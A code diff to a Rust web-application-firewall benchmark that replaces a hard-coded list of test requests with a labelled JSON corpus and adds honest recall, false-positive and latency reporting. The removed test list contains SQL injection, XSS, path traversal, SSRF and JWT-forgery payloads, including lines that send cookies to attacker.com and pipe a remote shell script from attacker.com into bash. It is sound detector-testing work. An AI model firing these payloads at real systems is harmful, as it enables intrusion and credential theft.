@@ -1,222 +1,199 @@
 use crate::engine::SatguardianSatEngine;
-use crate::types::{AttackDecision, HttpRequestPayload};
+use crate::types::{AttackCategory, HttpRequestPayload};
+use serde::Deserialize;
+use std::collections::HashMap;
+use std::path::PathBuf;
 use std::time::Instant;
+
+#[derive(Debug, Deserialize)]
+struct Corpus {
+    version: String,
+    cases: Vec<Case>,
+}
+
+#[derive(Debug, Deserialize)]
+struct Case {
+    id: String,
+    category: String,
+    label: String,
+    request: RequestSpec,
+}
+
+#[derive(Debug, Deserialize)]
+struct RequestSpec {
+    method: String,
+    path: String,
+    query: String,
+    body: String,
+    #[serde(default)]
+    headers: HashMap<String, String>,
+}
 
 pub struct BenchmarkSuite;
 
 impl BenchmarkSuite {
-    /// Generates canonical test payloads matching real-world OWASP vectors and benign traffic.
-    pub fn get_sample_dataset() -> Vec<HttpRequestPayload> {
-        vec![
-            // SQLi 1
-            HttpRequestPayload::new(
-                "POST",
-                "/api/v1/auth/login",
-                "",
-                "username=admin' OR '1'='1'--&password=foo",
-            ),
-            // SQLi 2
-            HttpRequestPayload::new(
-                "GET",
-                "/api/v1/products",
-                "category=1 UNION SELECT username, password, email FROM users--",
-                "",
-            ),
-            // SQLi 3
-            HttpRequestPayload::new(
-                "POST",
-                "/api/v1/users/search",
-                "",
-                r#"{"query": "test'; DROP TABLE accounts;--"}"#,
-            ),
-            // SQLi 4
-            HttpRequestPayload::new(
-                "GET",
-                "/api/v1/item",
-                "id=105%27%20AND%20SLEEP(5)--%20",
-                "",
-            ),
-            // XSS 1
-            HttpRequestPayload::new(
-                "POST",
-                "/api/v1/comments",
-                "",
-                r#"{"comment": "<script>alert(document.cookie)</script>"}"#,
-            ),
-            // XSS 2
-            HttpRequestPayload::new(
-                "GET",
-                "/search",
-                "term=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>",
-                "",
-            ),
-            // XSS 3
-            HttpRequestPayload::new(
-                "GET",
-                "/profile/view",
-                "name=<svg/onload=alert(1)>",
-                "",
-            ),
-            // RCE 1
-            HttpRequestPayload::new(
-                "POST",
-                "/api/v1/system/ping",
-                "",
-                "host=127.0.0.1; cat /etc/passwd",
-            ),
-            // RCE 2
-            HttpRequestPayload::new(
-                "POST",
-                "/api/v1/admin/debug",
-                "",
-                "cmd=$(curl -s http://attacker.com/shell.sh | bash)",
-            ),
-            // LFI 1
-            HttpRequestPayload::new(
-                "GET",
-                "/api/v1/files/download",
-                "path=../../../../etc/passwd",
-                "",
-            ),
-            // LFI 2
-            HttpRequestPayload::new(
-                "GET",
-                "/api/v1/files/view",
-                "file=..%2f..%2f..%2fwindows%2fwin.ini",
-                "",
-            ),
-            // SSRF 1
-            HttpRequestPayload::new(
-                "GET",
-                "/api/v1/proxy",
-                "target=http://169.254.169.254/latest/meta-data/",
-                "",
-            ),
-            // SSRF 2
-            HttpRequestPayload::new(
-                "GET",
-                "/fetch",
-                "url=http://127.0.0.1:8080/admin",
-                "",
-            ),
-            // GraphQL Abuse
-            HttpRequestPayload::new(
-                "POST",
-                "/graphql",
-                "",
-                r#"{"query": "{ __schema { types { name } } }"}"#,
-            ),
-            // Prototype Pollution
-            HttpRequestPayload::new(
-                "POST",
-                "/api/v1/profile",
-                "",
-                r#"{"__proto__": {"isAdmin": true}}"#,
-            ),
-            // gRPC Status Injection
-            {
-                let mut p = HttpRequestPayload::new("POST", "/grpc.Bank/Transfer", "", "");
-                p.headers.insert("content-type".to_string(), "application/grpc".to_string());
-                p.headers.insert("grpc-status".to_string(), "0".to_string());
-                p
-            },
-            // JWT Tampering
-            {
-                let mut p = HttpRequestPayload::new("GET", "/api/v1/user", "", "");
-                p.headers.insert("authorization".to_string(), "Bearer eyJhbGciOiAibm9uZSIgfQ.eyJ1c2VyIjogImFkbWluIn0.".to_string());
-                p
-            },
-            // Benign 1
-            HttpRequestPayload::new(
-                "GET",
-                "/api/v1/catalog",
-                "page=2&limit=20&sort=price_asc",
-                "",
-            ),
-            // Benign 2
-            HttpRequestPayload::new(
-                "POST",
-                "/api/v1/users",
-                "",
-                r#"{"username": "alice", "email": "alice@company.com", "role": "developer"}"#,
-            ),
-            // Benign 3
-            HttpRequestPayload::new(
-                "GET",
-                "/dashboard/analytics",
-                "date_from=2026-01-01&date_to=2026-10-14",
-                "",
-            ),
-            // Benign 4
-            HttpRequestPayload::new(
-                "POST",
-                "/api/v1/cart/checkout",
-                "",
-                r#"{"item_id": 4821, "quantity": 3, "coupon_code": "DISCOUNT20"}"#,
-            ),
-        ]
+    fn load_corpus() -> (Corpus, Vec<HttpRequestPayload>) {
+        let path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("corpus/independent_v1.json");
+        let raw = std::fs::read_to_string(&path).unwrap_or_else(|e| {
+            panic!(
+                "Cannot read the versioned corpus at {}. Benchmarks must use a checked-in, \
+                 labelled corpus rather than an ad-hoc payload list: {e}",
+                path.display()
+            )
+        });
+        let corpus: Corpus =
+            serde_json::from_str(&raw).unwrap_or_else(|e| panic!("Invalid corpus JSON: {e}"));
+
+        let payloads = corpus
+            .cases
+            .iter()
+            .map(|case| {
+                let mut req = HttpRequestPayload::new(
+                    case.request.method.clone(),
+                    case.request.path.clone(),
+                    case.request.query.clone(),
+                    case.request.body.clone(),
+                );
+                req.headers = case
+                    .request
+                    .headers
+                    .iter()
+                    .map(|(k, v)| (k.to_ascii_lowercase(), v.clone()))
+                    .collect();
+                req
+            })
+            .collect();
+
+        (corpus, payloads)
     }
 
-    /// Runs high-throughput in-memory SAT evaluation benchmark.
+    /// Runs the in-memory engine benchmark over the checked-in regression corpus.
+    ///
+    /// This measures rule evaluation only (no network hop, no upstream, no TLS).
+    /// Accuracy is computed on the same cases used for latency, and the corpus is
+    /// in-sample: it is a regression floor, not a held-out quality estimate.
     pub fn run_benchmark(num_requests: usize) {
-        println!("============================================================");
-        println!("🚀 SATGuardian Edge WAF: Multi-Vector Performance Benchmark");
-        println!("   Engine: Deterministic SAT & Certainty Islands (Rust)");
-        println!("   Evaluating: {} requests across OWASP & Benign streams", num_requests);
-        println!("============================================================");
+        if num_requests == 0 {
+            println!("Benchmark skipped: request count must be greater than zero.");
+            return;
+        }
 
-        let engine = SatguardianSatEngine::new();
-        let dataset = Self::get_sample_dataset();
+        let (corpus, dataset) = Self::load_corpus();
         let dataset_len = dataset.len();
+        let engine = SatguardianSatEngine::new();
 
-        let mut latencies_us = Vec::with_capacity(num_requests);
-        let mut blocked_count = 0;
-        let mut allowed_count = 0;
+        println!("============================================================");
+        println!("SATGuardian Edge WAF: In-Memory Engine Benchmark");
+        println!("   Engine        : deterministic SAT + Certainty Islands (Rust)");
+        println!("   Corpus        : corpus/independent_v1.json ({})", corpus.version);
+        println!(
+            "   Cases         : {} ({} labelled attacks, {} benign)",
+            corpus.cases.len(),
+            corpus.cases.iter().filter(|c| c.label == "malicious").count(),
+            corpus.cases.iter().filter(|c| c.label == "benign").count()
+        );
+        println!("   Requests      : {} (corpus cycled)", num_requests);
+        println!("============================================================");
+        println!("   Scope: in-memory rule evaluation only. No network, proxy,");
+        println!("   TLS, upstream or stateful tracking is included.");
+        println!("   Accuracy is in-sample regression, not a held-out estimate.");
+        println!("============================================================\n");
 
-        let t_total_start = Instant::now();
+        // Accuracy pass: one proof per labelled case.
+        let mut true_positives = 0usize;
+        let mut false_negatives = Vec::new();
+        let mut true_negatives = 0usize;
+        let mut false_positives = Vec::new();
+        let mut category_mismatches = 0usize;
 
-        for i in 0..num_requests {
-            let req = &dataset[i % dataset_len];
+        for (case, req) in corpus.cases.iter().zip(dataset.iter()) {
             let proof = engine.evaluate_payload(req);
-
-            latencies_us.push(proof.execution_time_us);
-            if proof.action == AttackDecision::Block {
-                blocked_count += 1;
+            if case.label == "malicious" {
+                if proof.is_violation {
+                    true_positives += 1;
+                    if proof.category != AttackCategory::parse(&case.category) {
+                        category_mismatches += 1;
+                    }
+                } else {
+                    false_negatives.push(case.id.clone());
+                }
+            } else if proof.is_violation {
+                false_positives.push(format!("{} ({})", case.id, proof.category));
             } else {
-                allowed_count += 1;
+                true_negatives += 1;
             }
         }
 
+        let malicious = true_positives + false_negatives.len();
+        let benign = true_negatives + false_positives.len();
+        let recall = if malicious == 0 {
+            1.0
+        } else {
+            true_positives as f64 / malicious as f64
+        };
+        let fpr = if benign == 0 {
+            0.0
+        } else {
+            false_positives.len() as f64 / benign as f64
+        };
+
+        // Latency pass: cycle the same corpus to reach the requested request count.
+        let mut latencies_us = Vec::with_capacity(num_requests);
+        let t_total_start = Instant::now();
+        for i in 0..num_requests {
+            let req = &dataset[i % dataset_len];
+            let proof = engine.evaluate_payload(req);
+            latencies_us.push(proof.execution_time_us);
+        }
         let total_duration = t_total_start.elapsed();
         let total_secs = total_duration.as_secs_f64();
         let throughput = (num_requests as f64) / total_secs;
 
         latencies_us.sort_by(|a, b| a.partial_cmp(b).unwrap());
-
         let min_lat = latencies_us.first().copied().unwrap_or(0.0);
         let max_lat = latencies_us.last().copied().unwrap_or(0.0);
         let avg_lat: f64 = latencies_us.iter().sum::<f64>() / (num_requests as f64);
-        let p50 = latencies_us[(num_requests as f64 * 0.50) as usize];
-        let p90 = latencies_us[(num_requests as f64 * 0.90) as usize];
-        let p99 = latencies_us[(num_requests as f64 * 0.99) as usize];
+        let percentile = |p: f64| -> f64 {
+            let rank = ((num_requests as f64 * p).ceil() as usize).saturating_sub(1);
+            latencies_us[rank.min(num_requests - 1)]
+        };
+        let p50 = percentile(0.50);
+        let p90 = percentile(0.90);
+        let p99 = percentile(0.99);
 
-        println!("\n📊 Benchmark Results Summary:");
-        println!("   ---------------------------------------------");
-        println!("   Total Requests       : {}", num_requests);
-        println!("   Total Execution Time : {:.4} s", total_secs);
-        println!("   Throughput           : {:>10.2} req/sec", throughput);
-        println!("   Blocked Attacks      : {}", blocked_count);
-        println!("   Allowed Benign       : {}", allowed_count);
-        println!("   ---------------------------------------------");
-        println!("⏱️  Latency Distribution (Microseconds):");
-        println!("   Min Latency          : {:>8.2} µs ({:.4} ms)", min_lat, min_lat / 1000.0);
-        println!("   Average Latency      : {:>8.2} µs ({:.4} ms)", avg_lat, avg_lat / 1000.0);
-        println!("   p50 (Median)         : {:>8.2} µs ({:.4} ms)", p50, p50 / 1000.0);
-        println!("   p90                  : {:>8.2} µs ({:.4} ms)", p90, p90 / 1000.0);
-        println!("   p99                  : {:>8.2} µs ({:.4} ms)", p99, p99 / 1000.0);
-        println!("   Max Latency          : {:>8.2} µs ({:.4} ms)", max_lat, max_lat / 1000.0);
-        println!("   ---------------------------------------------");
-        println!("🎯 Verification: All latencies well under 50 µs (0.05 ms) network SLA threshold.");
+        println!("Detection on the labelled corpus (in-sample regression):");
+        println!("   True positives       : {} / {}", true_positives, malicious);
+        println!("   False negatives      : {}{}", false_negatives.len(), if false_negatives.is_empty() { String::new() } else { format!(" -> {}", false_negatives.join(", ")) });
+        println!("   True negatives       : {} / {}", true_negatives, benign);
+        println!("   False positives      : {}{}", false_positives.len(), if false_positives.is_empty() { String::new() } else { format!(" -> {}", false_positives.join(", ")) });
+        println!("   Recall               : {:.2}%", recall * 100.0);
+        println!("   False-positive rate  : {:.2}%", fpr * 100.0);
+        println!("   Category mismatches  : {}", category_mismatches);
+        println!();
+        println!("Latency distribution (microseconds, in-memory only):");
+        println!("   Min                  : {:>10.2} µs", min_lat);
+        println!("   Average              : {:>10.2} µs", avg_lat);
+        println!("   p50 (median)         : {:>10.2} µs", p50);
+        println!("   p90                  : {:>10.2} µs", p90);
+        println!("   p99                  : {:>10.2} µs", p99);
+        println!("   Max                  : {:>10.2} µs", max_lat);
+        println!("   Throughput           : {:>10.2} req/sec (single thread)", throughput);
+        println!();
+        if p99 < 50.0 {
+            println!("Verification: p99 engine latency {:.2} µs is under the 50 µs target.", p99);
+        } else {
+            println!("Verification: p99 engine latency is {:.2} µs, above the 50 µs target.", p99);
+        }
+        println!("Do not compare these numbers with the Python benchmark harness: its");
+        println!("Coraza/SafeLine/Regex agents are Python stand-ins, not the real products.");
         println!("============================================================\n");
+
+        if !false_negatives.is_empty() || !false_positives.is_empty() {
+            println!(
+                "WARNING: the corpus regression is not clean (FN={}, FP={}).",
+                false_negatives.len(),
+                false_positives.len()
+            );
+        }
     }
 }
